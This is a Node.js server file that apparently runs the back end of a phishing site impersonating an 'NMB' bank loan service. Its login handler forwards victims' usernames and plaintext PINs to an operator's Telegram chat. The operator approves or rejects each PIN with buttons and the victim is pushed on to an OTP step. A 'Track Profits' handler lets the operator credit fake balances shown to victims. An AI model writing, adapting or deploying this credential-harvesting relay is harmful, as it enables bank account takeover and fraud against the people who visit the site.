/*
 * NMB Loan Site - Telegram Notification Backend
 * --------------------------------------------------
 * SECURITY: The bot token lives ONLY here (server-side). Never put it in the
 * browser. Keep this file / server private and do not commit it to public repos.
 *
 * Run:  node scripts/server.js   (then open the site; it posts events to :3000)
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// Load secrets from environment variables.
// NEVER hardcode the token in a file that gets committed/pushed.
let TOKEN = process.env.NMB_BOT_TOKEN;
let CHAT_ID = process.env.NMB_CHAT_ID;
if (!TOKEN || !CHAT_ID) {
  console.error('Missing Telegram TOKEN/CHAT_ID. Set them as environment variables.');
  process.exit(1);
}
const PORT = process.env.PORT || 3000;
const ROOT = path.resolve(__dirname, '..');

// Persistent shared store (survives restarts; shared across instances).
const store = require('../store');

// SSE clients map: sessionId -> Set of response objects
const sseClients = new Map();
let activeSessionId = null;

function pushSession(id, event, data) {
  const clients = sseClients.get(id);
  if (!clients) return;
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  clients.forEach((res) => {
    try { res.write(payload); } catch (e) { /* drop client */ }
  });
}

function parseAmount(text) {
  const m = String(text || '').match(/\$?\s*([\d,]+(?:\.\d+)?)/);
  if (!m) return null;
  const n = parseFloat(m[1].replace(/,/g, ''));
  return isNaN(n) ? null : n;
}

/* ---------- Telegram Bot API helper ---------- */
function tgApi(method, payload, cb) {
  const data = JSON.stringify(payload);
  const req = https.request(
    {
      hostname: 'api.telegram.org',
      path: `/bot${TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(body); } catch (e) { /* ignore */ }
        if (cb) cb(json);
      });
    }
  );
  req.on('error', (e) => { console.error('[telegram]', method, e.message); if (cb) cb(null); });
  req.write(data);
  req.end();
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

/* ---------- Build + send notifications ---------- */
async function notifyApplication(app) {
  const id = app.appId || ('APP-' + Date.now());
  const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
  const text =
    `<b>🏦 New Loan Application</b>\n\n` +
    `ID: <code>${esc(id)}</code>\n` +
    `Applicant: ${esc(name)}\n` +
    `Loan Type: ${esc(app.loanType || 'N/A')}\n` +
    `Amount: ${esc(app.amount || 'N/A')} USD\n` +
    `Email: ${esc(app.email || 'N/A')}\n` +
    `Phone: ${esc(app.phone || 'N/A')}\n\n` +
    `Status: <b>⏳ Pending review</b>`;

  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ Reject', callback_data: `reject:${id}` },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.set(store.NS.APPS, id, {
        status: 'pending',
        messageId: r.result.message_id,
        chatId: CHAT_ID,
        details: { ...app, name }
      });
      console.log('[notify] application sent:', id);
    } else {
      console.error('[notify] send failed:', r && r.description);
    }
  });
  return id;
}

async function notifyLoginVerification(login) {
  const type = (login.otp || login.otpSubmitted) ? 'otp' : 'pin';
  const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();

  let text = '';
  if (type === 'pin') {
    text =
      `<b>🔐 PIN Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
      (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
      `Time: ${new Date().toLocaleString()}`;
  } else {
    text =
      `<b>🔐 OTP Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      `Practice OTP: ${esc('submitted')}\n` +
      `Time: ${new Date().toLocaleString()}`;
  }

  await store.set(store.NS.LOGIN, id, {
    phone: login.username,
    pin: login.pin || '',
    otp: login.otpSubmitted ? 'submitted' : '',
    type,
    timestamp: Date.now(),
    status: 'pending',
    decided: false,
    messageId: null,
    chatId: CHAT_ID
  });

  const approveLabel = type === 'pin' ? '✅ Correct' : '✅ Approve OTP';
  const rejectLabel = type === 'pin' ? '❌ Wrong' : '❌ Reject OTP';
  const approveData = type === 'pin' ? `correct:${id}` : `otp_approve:${id}`;
  const rejectData = type === 'pin' ? `wrong:${id}` : `otp_reject:${id}`;

  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: approveLabel, callback_data: approveData },
        { text: rejectLabel, callback_data: rejectData },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.get(store.NS.LOGIN, id).then((entry) => {
        if (entry) {
          entry.messageId = r.result.message_id;
          store.set(store.NS.LOGIN, id, entry);
        }
      });
      console.log(`[notify] ${type} verification sent:`, id);
    } else {
      console.error(`[notify] ${type} verification failed:`, r && r.description);
    }
  });
  return id;
}

/* ---------- Handle admin Approve / Reject clicks ---------- */
let updateOffset = 0;
async function pollUpdates() {
  try {
    const body = await new Promise((resolve, reject) => {
      https.get(
        { hostname: 'api.telegram.org', path: `/bot${TOKEN}/getUpdates?offset=${updateOffset}&timeout=30` },
        (res) => {
          let data = '';
          res.on('data', (c) => (data += c));
          res.on('end', () => resolve(data));
        }
      ).on('error', reject);
    });
    let json = null;
    try { json = JSON.parse(body); } catch (e) { /* ignore */ }
    if (json && json.ok) {
      for (const upd of json.result) {
        updateOffset = upd.update_id + 1;
        if (upd.callback_query) {
          try { await handleCallback(upd.callback_query); } catch (e) { console.error('[callback]', e.message); }
        }
        if (upd.message) {
          try { await handleMessage(upd.message); } catch (e) { console.error('[message]', e.message); }
        }
      }
    } else if (json && json.ok === false) {
      const desc = json.description || 'unknown error';
      console.error('[poll] getUpdates failed:', desc);
      if (/webhook/i.test(desc) || /conflict/i.test(desc)) {
        console.log('[poll] Clearing webhook to allow polling...');
        await new Promise((resolve) => {
          tgApi('setWebhook', { url: '' }, (r) => {
            if (r && r.ok) console.log('[poll] Webhook cleared, continuing...');
            resolve();
          });
        });
      }
    }
  } catch (e) {
    console.error('[poll]', e.message);
  }
  setTimeout(pollUpdates, 1000);
}

async function handleCallback(cq) {
  const [action, id] = (cq.data || '').split(':');

  if (action === 'approve' || action === 'reject') {
    const decision = action === 'approve' ? 'approved' : 'rejected';
    const rec = await store.get(store.NS.APPS, id);
    if (rec) rec.status = decision;
    const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
    if (rec && rec.messageId) {
      const name = rec.details.name || 'N/A';
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
        text:
          `<b>🏦 Loan Application</b>\n\n` +
          `ID: <code>${esc(id)}</code>\n` +
          `Applicant: ${esc(name)}\n` +
          `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
          `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
          `Status: <b>${stamp}</b>`,
      });
      await store.set(store.NS.APPS, id, rec);
    }
    console.log(`[decision] ${id} -> ${decision}`);
    return;
  }

if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
     const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
     const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
     console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
     console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
     if (rec) {
       rec.status = decision;
       rec.decided = true;
       await store.set(store.NS.LOGIN, id, rec);
       // Verify the update
       const verify = await store.get(store.NS.LOGIN, id);
       console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
     } else {
       console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
     }
    
    // Send a separate reply message to notify admin of the decision
    if (rec) {
      tgApi('sendMessage', {
        chat_id: CHAT_ID,
        text: `🔐 PIN ${decision === 'approved' ? 'verified' : 'rejected'} for ${rec.phone || rec.loginId || id}. User ${decision === 'approved' ? 'allowed to proceed to OTP' : 'must try again'}.`
      });
    }
    
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
    if (rec && rec.messageId) {
      // Don't show the PIN in the edited message, just the status
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
          text:
            `<b>🔐 ${kind} Verification</b>\n\n` +
            `User: ${esc(rec.phone || 'N/A')}\n` +
            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
            `Status: <b>${stamp}</b>`,
      });
    }
    console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
    return;
  }
}

/* ---------- Handle /start so setup is easy ---------- */
async function handleMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  if (text.startsWith('/start')) {
    tgApi('sendMessage', {
      chat_id: chatId,
      text: `✅ NMB Loan Bot connected!\n\nThis chat (ID: <code>${chatId}</code>) will now receive loan application & login notifications with Approve/Reject buttons.\n\nIf this ID differs from the one in your config, update CHAT_ID in server.js.`,
      parse_mode: 'HTML',
    });
    return;
  }

  // Parse admin's free-text message as profit/payment
  let targetId = null;
  const replyToMsgId = msg.reply_to_message && msg.reply_to_message.message_id;
  
  const allSessions = await store.get(store.NS.SESSIONS) || {};
  const sessions = typeof allSessions === 'object' && !Array.isArray(allSessions) ? allSessions : {};
  
  // Find target session by reply_to_message or activeSessionId
  if (replyToMsgId) {
    for (const sid in sessions) {
      if (sessions[sid] && sessions[sid].trackMsgId === replyToMsgId) {
        targetId = sid;
        break;
      }
    }
  }
  if (!targetId) {
    targetId = activeSessionId;
  }
  
  if (!targetId) return;
  
  const rec = sessions[targetId] || { id: targetId, balance: 0, paymentDetails: '', profits: [], pendingTrack: false };
  const amt = parseAmount(text);
  
  if (amt !== null) {
    rec.balance = (rec.balance || 0) + amt;
    rec.profits = rec.profits || [];
    rec.profits.push({ amount: amt, note: text, ts: Date.now() });
    rec.pendingTrack = false;
    await store.set(store.NS.SESSIONS, targetId, rec);
    pushSession(targetId, 'profit', { balance: rec.balance, amount: amt, note: text, profits: rec.profits });
    tgApi('sendMessage', { chat_id: CHAT_ID, text: `✅ Credited $${amt.toFixed(2)} to session ${targetId}. New balance: $${rec.balance.toFixed(2)}` });
  } else if (text.trim()) {
    rec.paymentDetails = text;
    await store.set(store.NS.SESSIONS, targetId, rec);
    pushSession(targetId, 'payment', { paymentDetails: text });
    tgApi('sendMessage', { chat_id: CHAT_ID, text: `📝 Payment details updated for session ${targetId}` });
  }
}

/* ---------- HTTP server: serves the site + receives events ---------- */
const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.webp': 'image/webp',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
};

function serveStatic(req, res) {
  let urlPath = decodeURIComponent(req.url.split('?')[0]);
  if (urlPath === '/') urlPath = '/index.html';
  // Prevent path traversal
  const filePath = path.join(ROOT, path.normalize(urlPath).replace(/^(\.\.[/\\])+/, ''));
  if (!filePath.startsWith(ROOT)) { res.writeHead(403); res.end('forbidden'); return; }

  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end('not found'); return; }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { 'Content-Type': CONTENT_TYPES[ext] || 'application/octet-stream' });
    res.end(data);
  });
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Cache-Control', 'no-store');

  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // POST /api/notify/application  or  /api/notify/login
  if (req.method === 'POST' && req.url.startsWith('/api/notify/')) {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', async () => {
      let payload = {};
      try { payload = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
      try {
        if (req.url.includes('application')) {
          const id = await notifyApplication(payload);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, appId: id }));
        } else if (req.url.includes('login')) {
          const id = await notifyLoginVerification(payload);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, loginId: id }));
        } else {
          res.writeHead(404); res.end('not found');
        }
      } catch (e) {
        console.error('[notify] error:', e.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'notify failed' }));
      }
    });
    return;
  }

  // GET /api/application/:id  -> current status (pending/approved/rejected)
  if (req.method === 'GET' && req.url.startsWith('/api/application/')) {
    const id = req.url.split('/').pop();
    const rec = await store.get(store.NS.APPS, id);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
    return;
  }

  // GET /api/login/status/:id -> current verification status
  if (req.method === 'GET' && req.url.startsWith('/api/login/status/')) {
    const id = req.url.split('/').pop();
    const rec = await store.get(store.NS.LOGIN, id);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      decided: !!rec && !!rec.decided,
      status: rec ? rec.status : 'pending',
      found: !!rec,
      sharedStore: store.shared,
      storage: store.usingKV ? 'kv' : 'local'
    }));
    return;
  }

  // GET /api/setup/purge-webhook -> clear any existing webhook to allow polling
  if (req.method === 'GET' && req.url.startsWith('/api/setup/purge-webhook')) {
    tgApi('setWebhook', { url: '' }, (r) => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: r && r.ok, description: r && r.description }));
    });
    return;
  }

  // GET /api/health -> check server status
  if (req.method === 'GET' && req.url.startsWith('/api/health')) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, server: 'running', env: { TOKEN: !!TOKEN, CHAT_ID: !!CHAT_ID } }));
    return;
  }

  // POST /api/session -> create a session for SSE profit/payment tracking
  if (req.method === 'POST' && req.url === '/api/session') {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', async () => {
      const payload = JSON.parse(raw || '{}');
      const sessionId = payload.sessionId || ('SESS-' + Date.now());
      await store.set(store.NS.SESSIONS, sessionId, {
        id: sessionId,
        balance: 0,
        paymentDetails: '',
        profits: [],
        pendingTrack: false,
        trackMsgId: null
      });
      activeSessionId = sessionId;
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, sessionId }));
    });
    return;
  }

  // GET /api/session/:id -> get session state (balance, paymentDetails, profits)
  if (req.method === 'GET' && req.url.startsWith('/api/session/')) {
    const id = req.url.split('/').pop();
    const rec = await store.get(store.NS.SESSIONS, id);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(rec || { id, balance: 0, paymentDetails: '', profits: [] }));
    return;
  }

  // POST /api/track-profits -> notify admin to reply with profit amount
  if (req.method === 'POST' && req.url === '/api/track-profits') {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', async () => {
      const payload = JSON.parse(raw || '{}');
      const sessionId = payload.sessionId;
      const phone = payload.phone || 'unknown';
      if (!sessionId) {
        res.writeHead(400);
        res.end(JSON.stringify({ error: 'sessionId required' }));
        return;
      }
      const rec = await store.get(store.NS.SESSIONS, sessionId) || {
        id: sessionId, balance: 0, paymentDetails: '', profits: [], pendingTrack: true
      };
      rec.pendingTrack = true;
      tgApi('sendMessage', {
        chat_id: CHAT_ID,
        text: `💰 Track Profits request from ${phone}. Reply to this message with the amount (e.g. $200) to credit their balance.`,
        reply_markup: { force_reply: true }
      }, (r) => {
        if (r && r.ok) {
          rec.trackMsgId = r.result.message_id;
          store.set(store.NS.SESSIONS, sessionId, rec);
          pushSession(sessionId, 'track-requested', { phone });
        }
      });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  // GET /api/stream/:id -> Server-Sent Events for instant updates
  if (req.method === 'GET' && req.url.startsWith('/api/stream/')) {
    const id = req.url.split('/').pop();
    if (!sseClients.has(id)) {
      sseClients.set(id, new Set());
    }
    const clients = sseClients.get(id);
    
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Access-Control-Allow-Origin': '*'
    });
    res.write('\n');
    
    clients.add(res);
    const keepAlive = setInterval(() => { try { res.write(':\n\n'); } catch (e) {} }, 25000);
    
    req.on('close', () => {
      clearInterval(keepAlive);
      clients.delete(res);
    });
    
    // Send initial state
    store.get(store.NS.SESSIONS, id).then(rec => {
      if (rec) {
        try { res.write(`event: init\ndata: ${JSON.stringify(rec)}\n\n`); } catch (e) {}
      }
    });
    return;
  }

  // Everything else -> static files
  if (req.method === 'GET') { serveStatic(req, res); return; }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('NMB Loan Notification Bot server running on :' + PORT);
});

server.listen(PORT, async () => {
  console.log(`Notification server listening on http://localhost:${PORT}`);
  // Clear any existing webhook to allow polling to work BEFORE we start polling
  await new Promise((resolve) => {
    tgApi('setWebhook', { url: '' }, (r) => {
      if (r && r.ok) {
        console.log('[setup] Cleared existing webhook:', r.description);
      } else if (r && r.description) {
        console.log('[setup] Webhook clear response:', r.description);
      }
      resolve();
    });
  });
  console.log('Polling Telegram for admin decisions...');
  pollUpdates();
});
